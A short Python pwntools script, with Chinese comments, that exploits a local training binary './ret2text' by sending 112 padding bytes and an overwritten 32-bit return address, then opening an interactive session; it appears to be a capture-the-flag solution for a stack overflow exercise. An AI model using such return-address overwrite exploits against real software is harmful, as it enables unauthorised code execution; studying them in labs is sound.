from pwn import *
#目标文件
TARGET ='./ret2text'
retaddr=0x804863a
payload=b'A'*112
#启动目标文件并发送 payload
r = process(TARGET)
r.sendline(payload+p32(retaddr))
# 交互模式(查看输出)
r.interactive( )